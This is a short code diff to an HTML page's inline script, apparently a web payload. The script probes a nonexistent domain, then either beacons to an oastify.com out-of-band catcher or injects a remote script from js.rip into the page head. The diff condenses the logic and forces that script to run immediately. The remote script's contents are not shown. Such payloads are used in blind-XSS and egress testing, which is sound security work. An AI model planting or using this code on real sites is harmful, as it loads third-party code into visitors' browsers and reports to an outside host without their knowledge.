@@ -5,23 +5,16 @@
   <script>
     fetch("https://nonexistingone.com/")
       .then(res => {
-        // If response is opaque (CORS blocked), status is 0 and type is 'opaque'
-        if (res.status === 0 || res.type === "opaque") {
-          throw new Error("CORS-blocked or unreachable");
-        }
-        // Optional: check for empty body or other suspicious behavior
+        if (res.status === 0 || res.type === "opaque") throw new Error("Blocked");
         return res.text().then(body => {
-          if (!body || body.length === 0) {
-            throw new Error("Empty response");
-          }
-          // Success path
+          if (!body || body.length === 0) throw new Error("Empty");
           fetch("https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/hit?ts=" + Date.now());
         });
       })
       .catch(() => {
-        // Failure path
         const s = document.createElement("script");
         s.src = "https://js.rip/5mw8at9w5s?ts=" + Date.now();
+        s.async = false; // force immediate execution
         document.head.appendChild(s);
       });
   </script>
